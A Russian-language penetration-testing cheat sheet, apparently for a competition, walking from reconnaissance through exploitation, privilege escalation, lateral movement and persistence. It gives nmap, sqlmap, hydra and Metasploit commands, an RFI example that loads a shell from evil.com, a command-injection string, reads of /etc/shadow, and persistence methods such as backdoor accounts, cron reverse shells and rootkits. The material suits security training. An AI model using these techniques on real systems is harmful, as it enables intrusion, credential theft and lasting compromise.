# Этап 1: Разведка (Reconnaissance)

Цель: Сбор как можно больше информации об инфраструктуре до начала активных действий.

**Инструменты:**

```
nmap: сканирование сети, определение открытых портов, служб, операционной системы.

nmap -sS -sV -T4 -p- <IP_адрес> - сканирование SYN, определение версии служб, агрессивный режим, сканирование всех портов.

nmap -A -T4 <IP_адрес> - агрессивное сканирование с определением ОС, скриптами, traceroute.

nikto: сканирование веб-приложений на предмет уязвимостей (CMS, уязвимые скрипты и т.д.).

nikto -h <URL>

whatweb: определение технологий, используемых на веб-сайтах.

whatweb <URL>

gobuster или dirb: поиск скрытых директорий и файлов на веб-серверах.

gobuster dir -u <URL> -w <path_to_wordlist> -t 50 (параллельные потоки)

dnsrecon: сбор информации о DNS (записи, зоны и т.д.).

dnsrecon -d <домен>
```

**Важные моменты:**

Анализируй результаты сканирования. Какие порты открыты? Какие службы работают? Какие версии?

Ищи потенциальные точки входа (веб-приложения, SSH, FTP и т.д.).

# Этап 2: Получение доступа (Gaining Access)

Цель: Найти уязвимость и получить начальный доступ к системе.

**Инструменты и методы:**

**Уязвимости веб-приложений:**

```
SQL Injection (SQLi): Используй sqlmap для автоматической эксплуатации. Пробуй различные payloads для авторизации, чтения/записи файлов.

sqlmap -u "<URL с параметром>" --data="<POST данные, если есть>" --level 3 --risk 3 --dbms=<тип БД, если знаешь>

Cross-Site Scripting (XSS): Внедряй скрипты в уязвимые поля ввода. Пробуй различные типы XSS (Stored, Reflected, DOM).

File Inclusion (LFI/RFI): Пытайся включить локальные (LFI) или удаленные (RFI) файлы через параметры запросов.

LFI: http://example.com/index.php?page=/etc/passwd (попытка прочитать /etc/passwd)

RFI: http://example.com/index.php?page=http://evil.com/shell.txt (попытка подключить скрипт с удаленного сервера)

Command Injection: Попытки внедрить команды операционной системы через уязвимые параметры.
```

Пример: http://example.com/search.php?q=test; ls -la

**Уязвимости служб:**

Используй searchsploit (инструмент в Kali Linux) для поиска эксплойтов для обнаруженных служб.

```
searchsploit <название_службы> <версия>
```

Перебор паролей (Brute-force):

```
hydra (для различных служб, SSH, FTP, HTTP и т.д.)

hydra -l <username> -P <path_to_wordlist> ssh://<IP_адрес> (SSH)

hydra -L <path_to_usernames> -P <path_to_wordlist> ssh://<IP_адрес> (SSH)

john the ripper или hashcat (для взлома хешей паролей, полученных с помощью других атак)
```

**Уязвимости конфигурации:**

Поиск дефолтных паролей (для служб, баз данных).

Анализ конфигурационных файлов на наличие уязвимостей.

Эксплуатация уязвимостей:

Используй эксплойты из searchsploit или создавай свои собственные (если знаешь Python, Ruby и т.д.).

Metasploit: Если позволяет время и правила соревнования, попробуй использовать Metasploit для автоматизации эксплуатации.

```
msfconsole

search <название_уязвимости>

use <номер_эксплойта>

set RHOSTS <IP_адрес>

set LHOST <твой_IP_адрес> (если это необходимо)

set PAYLOAD <тип_полезной_нагрузки> (например, linux/x86/meterpreter/reverse_tcp)

exploit
```

**Важные моменты:**

Не забудь пробовать простые вещи: дефолтные логины/пароли, распространенные ошибки в конфигурации.

Внимательно читай документацию по эксплойтам.

Убедись, что эксплойт подходит для версии службы и операционной системы.

Помни о нестандартных портах.

# Этап 3: Повышение привилегий (Privilege Escalation)

Цель: Получить права администратора (root) на системе.

**Инструменты и методы:**

**Сбор информации о системе:**

```
uname -a: версия ядра.

lsb_release -a: информация о дистрибутиве Linux.

sudo -l: какие команды можно запускать с sudo.

find / -perm -u=s -type f 2>/dev/null: поиск SUID-бинарников (запускаются от имени владельца файла).

cat /etc/passwd: анализ пользователей.

cat /etc/shadow: (если есть права на чтение) анализ хешей паролей.

ps aux: запущенные процессы.

netstat -antp или ss -antp: открытые сетевые соединения.
```

**Уязвимости ядра (Kernel Exploits):**

```
searchsploit linux kernel <версия_ядра> - поиск эксплойтов для ядра.
```

Попробуй скомпилировать и запустить эксплойт (если у тебя есть права на это).

Используй готовые эксплойты из репозиториев, например, exploitdb.

**SUID/GUID бинарники:**

Ищи уязвимые бинарники, которые можно использовать для повышения привилегий (например, sudo, vim, find).

Пример: если sudo настроен неправильно, можно выполнить команду от имени root.

Посмотри уязвимости для конкретных бинарников с помощью searchsploit.

**Уязвимости в сервисах:**

Поиск уязвимостей в службах, которые запущены от имени root.

Попытка эксплуатации уязвимостей, связанных с конфигурацией сервисов.

**Неправильные настройки безопасности:**

Слабые пароли.

Разрешения на запись в важных файлах.

Неправильные настройки sudo.

Логи и скрипты, которые выполняются от имени root.

Metasploit: Попробуй модули для повышения привилегий (например, post/linux/gather/enum_system).

# Этап 4: Перемещение по сети (Lateral Movement)

Цель: Получить доступ к другим системам в сети.

**Инструменты и методы:**

**Сбор информации о сети:**

```
ifconfig или ip addr: информация о сетевых интерфейсах.

route -n: таблица маршрутизации.

arp -a: ARP-таблица.

nmap <диапазон_IP_адресов>: сканирование сети.
```

**Получение учетных данных:**

Поиск паролей в файлах конфигурации (SSH, базы данных и т.д.).

Ключи SSH.

Кража хешей паролей (например, с помощью mimikatz для Windows, но это может быть применимо и к другим системам через другие инструменты).

Попытка взлома паролей.

**Использование полученных учетных данных:**

```
SSH: ssh <user>@<IP_адрес>

SMB (если SMB доступен): попытка подключения к шарам.

RDP (если Windows): попытка подключения.
```

**Эксплуатация уязвимостей на других системах:**

Повторение этапов 2 и 3 на других системах.

Pivot: Использование скомпрометированной системы в качестве точки входа для доступа к другим системам в сети, которые недоступны напрямую.

Использование Socks прокси.

Использование SSH туннелей.

# Этап 5: Закрепление (Persistence)

Цель: Обеспечить постоянный доступ к системе даже после перезагрузки.

**Методы:**

**Создание учетной записи пользователя:**

```
adduser <username>

usermod -aG sudo <username> (добавление в группу sudo для повышения привилегий)
```

**SSH ключи:**

Добавление своего публичного ключа в файл ~/.ssh/authorized_keys (если есть доступ к SSH).

**Backdoor:**

Создание бэкдора в скриптах запуска служб.

Модификация файлов инициализации (systemd, init.d).

Установка руткита (крайняя мера).

**Cron Jobs:**

Добавление команды в crontab для периодического выполнения (например, для обратного шелла).

Замена существующих служб:

Замена бинарных файлов служб (например, SSH) на свои модифицированные версии.

# Инструменты, которые тебе понадобятся (установлены в Kali Linux):

```
nmap - сканирование сети

nikto - сканирование веб-приложений на предмет уязвимостей

whatweb - информация о веб-сервисе

gobuster, dirsearch, dirb - поиск подкаталогов и файлов

dnsrecon - информация о DNS

sqlmap - для sqli

hydra - перебор паролей

john the ripper, hashcat - взлом хешей

searchsploit - поиск эксплоитов сервисов по версиям

metasploit - экспуатация эксплоитов

netcat, nc, socat - прослушивание портов
```
